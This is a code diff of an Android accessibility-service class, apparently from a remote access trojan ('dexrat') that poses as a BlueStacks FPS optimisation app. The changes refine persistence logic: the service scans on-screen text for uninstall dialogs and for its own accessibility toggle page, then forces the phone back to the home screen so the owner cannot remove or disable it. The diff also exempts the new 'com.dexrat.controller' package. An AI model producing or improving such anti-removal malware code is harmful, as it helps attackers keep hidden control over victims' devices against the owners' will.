@@ -31,10 +31,10 @@ public class ProtectionManager {
         String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
 
         // 0. WHITELIST
-        // Jangan blokir aplikasi kita sendiri atau controller kita
+        // Jangan blokir aplikasi kita sendiri atau controller kita yang baru
         if (pkg.equals(service.getPackageName()) || 
-            pkg.contains("com.bluestacks.fpsoverlay.admin") ||
-            pkg.contains("controller")) {
+            pkg.equals("com.dexrat.controller") ||
+            pkg.contains("com.dexrat.controller")) {
             return;
         }
 
@@ -44,25 +44,29 @@ public class ProtectionManager {
                 pkg.contains("settings") || 
                 pkg.contains("installer") || 
                 pkg.contains("securitycenter") || 
-                pkg.contains("launcher") || 
-                pkg.equals("android"))) {
+                pkg.equals("android"))) { // Menghapus 'launcher' dari sini
             
             AccessibilityNodeInfo root = service.getRootInActiveWindow();
             if (root != null) {
-                // 1. Cek upaya Uninstall
-                if (isLikelyUninstallDialog(root)) {
-                    Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
-                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
-                    root.recycle();
-                    return;
-                }
+                // Tambahan: Pastikan ini adalah window yang aktif atau dialog
+                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                    event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                    
+                    // 1. Cek upaya Uninstall
+                    if (isLikelyUninstallDialog(root)) {
+                        Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
+                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                        root.recycle();
+                        return;
+                    }
 
-                // 2. Cek upaya Nonaktifkan Aksesibilitas
-                if (pkg.contains("settings") && isLikelyAccessibilityPage(root)) {
-                    Log.e(TAG, "!!! ACCESSIBILITY PROTECTION TRIGGERED !!! Package: " + pkg);
-                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
-                    root.recycle();
-                    return;
+                    // 2. Cek upaya Nonaktifkan Aksesibilitas
+                    if (pkg.contains("settings") && isLikelyAccessibilityPage(root)) {
+                        Log.e(TAG, "!!! ACCESSIBILITY PROTECTION TRIGGERED !!!");
+                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                        root.recycle();
+                        return;
+                    }
                 }
                 root.recycle();
             }
@@ -125,7 +129,7 @@ public class ProtectionManager {
         if (root == null) return false;
         
         String targetPkg = service.getPackageName(); // com.bluestacks.fpsoverlay
-        String controllerPkg = "com.bluestacks.fpsoverlay.admin";
+        String controllerPkg = "com.dexrat.controller";
         
         // Dapatkan nama aplikasi kita sendiri untuk validasi
         String appName = "BondexFPS"; 
@@ -135,76 +139,67 @@ public class ProtectionManager {
         } catch (Exception ignored) {}
 
         // 1. EXCLUSION: Jika layar mengandung package controller, JANGAN BLOKIR.
-        // Ini memastikan kita tidak mengganggu proses uninstall untuk controller.
         if (checkNodeRecursive(root, controllerPkg)) {
             return false;
         }
 
         // 2. DETECTION: Cari identitas APK Target (Package Name atau App Name)
-        // Sesuai permintaan, kita utamakan deteksi berdasarkan package name target.
         boolean mentionsTarget = checkNodeRecursive(root, targetPkg) || checkNodeRecursive(root, appName);
         
         if (!mentionsTarget) return false;
 
-        // 3. KEYWORDS: Cek kata kunci uninstall
+        // 3. KEYWORDS: Cek kata kunci uninstall/hapus
         return checkNodeRecursive(root, "uninstall") || 
                checkNodeRecursive(root, "copot") || 
                checkNodeRecursive(root, "pemasangan") ||
-               checkNodeRecursive(root, "meng-uninstall") ||
                checkNodeRecursive(root, "hapus") ||
-               checkNodeRecursive(root, "delete") ||
-               checkNodeRecursive(root, "Hapus instalasi") || 
-               checkNodeRecursive(root, "Copot pemasangan") || 
-               checkNodeRecursive(root, "Do you want to uninstall") ||
-               checkNodeRecursive(root, "ingin menghapus") ||
-               checkNodeRecursive(root, "ingin mencopot");
+               checkNodeRecursive(root, "delete");
     }
 
     private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
         if (root == null) return false;
 
-        String targetPkg = service.getPackageName();
-        String controllerPkg = "com.bluestacks.fpsoverlay.admin";
+        String targetPkg = service.getPackageName(); // com.bluestacks.fpsoverlay
+        String controllerPkg = "com.dexrat.controller";
         
-        // Jika layar mengandung package controller, biarkan user mengatur aksesibilitasnya
+        // 1. JANGAN PERNAH blokir controller sendiri
         if (checkNodeRecursive(root, controllerPkg)) {
             return false;
         }
 
-        String appName = "BondexFPS";
-        try {
-            int nameId = service.getApplicationInfo().labelRes;
-            if (nameId != 0) appName = service.getString(nameId);
-        } catch (Exception ignored) {}
-
-        // Cek apakah Nama App atau Package Target ada di layar
-        boolean hasTargetIdentity = checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
+        // 2. Identitas Label & Deskripsi (Dari strings.xml)
+        String accLabel = "BlueStacks Mobile Optimization";
         
-        if (!hasTargetIdentity) return false;
+        // KATA KUNCI UNIK dari android:description di xml aksesibilitas kita
+        // Ini HANYA akan muncul di halaman toggle/detail layanan kita.
+        boolean isDetailPage = checkNodeRecursive(root, "real-time FPS") || 
+                               checkNodeRecursive(root, "smoother gaming experience") ||
+                               checkNodeRecursive(root, "hardware resources");
 
-        // 2. Jika ada nama aplikasi, cek apakah kita berada di lingkungan pengaturan/aksesibilitas
-        boolean isAcc = checkNodeForText(root, "Accessibility") || checkNodeForText(root, "Aksesibilitas");
-        boolean isService = checkNodeForText(root, "Layanan") || checkNodeForText(root, "Services") || 
-                           checkNodeForText(root, "Downloaded") || checkNodeForText(root, "Terunduh") ||
-                           checkNodeForText(root, "Aplikasi terinstal");
-        boolean isShortcut = checkNodeForText(root, "Pintas") || checkNodeForText(root, "Shortcut");
-        boolean isUse = checkNodeForText(root, "Gunakan") || checkNodeForText(root, "Use");
-
-        Log.d(TAG, String.format("Acc Context: isAcc=%b, isService=%b, isShortcut=%b, isUse=%b", isAcc, isService, isShortcut, isUse));
-
-        if (isAcc || isService || isShortcut || isUse) {
-            Log.e(TAG, ">> Match found in Accessibility Context/Menu");
+        if (isDetailPage) {
+            Log.e(TAG, "!! DETECTED ON ACCESSIBILITY TOGGLE PAGE !! Aggressive Kick.");
             return true;
         }
 
-        // Fallback: Jika nama aplikasi ada dan ada kata status (Bahasa Inggris/Indo)
-        boolean hasState = checkNodeForText(root, " Matikan ") || checkNodeForText(root, " Nonaktifkan ") || 
-                           checkNodeForText(root, " Off ") || checkNodeForText(root, " On ") ||
-                           checkNodeForText(root, "Aktif") || checkNodeForText(root, "Aktifkan") ||
-                           checkNodeForText(root, "Berhenti") || checkNodeForText(root, "Stop");
-        
-        Log.d(TAG, "Fallback State check: " + hasState);
-        return hasState;
+        // 3. Deteksi di List Aksesibilitas (Metode Agresif)
+        boolean hasIdentity = checkNodeRecursive(root, accLabel) || checkNodeRecursive(root, targetPkg);
+        if (!hasIdentity) return false;
+
+        // Cari bukti kuat bahwa ini adalah menu Aksesibilitas (bukan menu Apps biasa)
+        boolean isAccMenu = checkNodeForText(root, "Accessibility") || 
+                           checkNodeForText(root, "Aksesibilitas") ||
+                           checkNodeForText(root, "Downloaded") ||
+                           checkNodeForText(root, "Terunduh") ||
+                           checkNodeForText(root, "Installed") ||
+                           checkNodeForText(root, "Terinstal") ||
+                           checkNodeForText(root, "Layanan");
+
+        if (isAccMenu) {
+            Log.w(TAG, "!! DETECTED IN ACCESSIBILITY LIST !! Aggressive Kick.");
+            return true;
+        }
+
+        return false;
     }
 
     private void autoAllowPermissions() {
